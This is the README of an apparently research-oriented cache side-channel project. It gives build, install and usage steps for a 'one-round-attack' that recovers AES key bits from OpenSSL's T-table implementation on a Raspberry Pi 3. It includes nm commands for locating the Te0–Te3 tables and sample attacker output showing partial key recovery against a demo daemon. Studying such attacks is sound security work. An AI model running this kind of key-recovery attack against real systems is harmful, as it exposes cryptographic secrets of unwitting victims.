# side-channel-attack

side-channel-attack

# Contents
1. [How to build - armv7](#1-How-to-build-armv7)
2. [How to build - armv8](#1-How-to-build-armv8)
3. [How to install to your device](#3-How-to-install-to-your-device)
4. [How to run one-round-attack - rpi3 (armv8)](#4-How-to-run-one-round-attack-rpi3-armv8)

# 1. How to build - armv7

* Build all
    ```
	$ vim build_armv7.sh  ==> apply your cross compiler to SCA_CROSS_COMPILER
    $ ./build_armv7.sh
    ```

# 2. How to build - armv8

* Build all
    ```
	$ vim build_armv8.sh  ==> apply your cross compiler to SCA_CROSS_COMPILER
    $ ./build_armv8.sh
    ```

# 3. How to install to your device

* Copy and install shared library
    ```
    $ cp -f build/lib/libcrypto.so.[version] usb/   ==> on your host
    
    $ cp -f usb/libcrypto.so.[version] /usr/lib/   ==> on target device
	==> libcrypto.so.0.9.8 for armv7, libcrypto.so.1.0.0 for armv8
    ```

* Copy and install attack binaries
    ```
    $ cp -f build/cache-attack/one-round-attack/real-security-daemon/* usb/  ==> on your host
    
    $ cp -f usb/* /usr/bin/  ==> on target device.
    ```

# 4. How to run one-round-attack - rpi3 (armv8)

* Get T-table address from openssl library (on your host)
	```
	$ nm libcrypto.so.1.0.0 | grep Te0
	  0000000000170090 r Te0
	$ nm libcrypto.so.1.0.0 | grep Te1
	  000000000016fc90 r Te1
	==> repeat for Te2, Te3..
	```

* Run one-round-attack on rpi3
	```
	$ ./security_daemon &
	  root@RPi3:/aes security_daemon is running...
	  real key : a2981898c47187538cde1709dbd9ab40
	$ ./attacker
	  USAGE : ./attacker <limit plain text count> <repeat count for a plaintext> <cpu cycle threshold> <offset te0> <offset te1> <offset te2> <offset te3>
	  EXAMPLE : ./attacker 1000 1 200 0010dca8 0010e0a8 0010e4a8 0010d8a8
	$ ./attacker 500 1 200 00170090 0016fc90 00170890 00170490
	  security_daemon_connect success
	  plain_text_cnt : 500
	  calculating all subsets...
	  progress : 4096 / 2048000
	  progress : 8192 / 2048000
	  .......
	  ....... 
	  predict key : a0901090c070805080d01000d0d0a040
	  Recover [64] bits success!!   ====>  It's result of attack!!!
	  security_daemon is closing...
	  [1]+  Done                       ./security_daemon
	```

# 5. Supported attack for each arch

* one-round-attack is enable on both armv7 and armv8.
* last-round-attack is enable on armv7. (to do on armv8)



